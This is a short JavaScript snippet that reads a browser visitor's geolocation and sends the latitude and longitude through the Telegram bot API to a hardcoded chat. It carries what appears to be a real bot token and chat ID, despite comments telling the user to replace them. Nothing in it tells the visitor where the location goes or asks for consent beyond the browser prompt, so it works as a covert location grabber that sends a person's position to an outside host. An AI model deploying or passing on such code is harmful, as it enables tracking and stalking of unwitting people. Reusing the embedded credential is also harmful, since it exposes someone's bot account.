function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocationToTelegram);
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}

function sendLocationToTelegram(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    // Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
    const botToken = '6600772362:AAGPK-6RuBbFgawE8QAttUQCzorY_Qh6ohA';
    // Replace 'YOUR_CHAT_ID' with your actual Telegram chat ID
    const chatId = '5538462835';
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Latitude: ${latitude}, Longitude: ${longitude}`;
    
    fetch(url)
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => console.log(data))
    .catch(error => console.error('There was a problem with the fetch operation:', error));
}
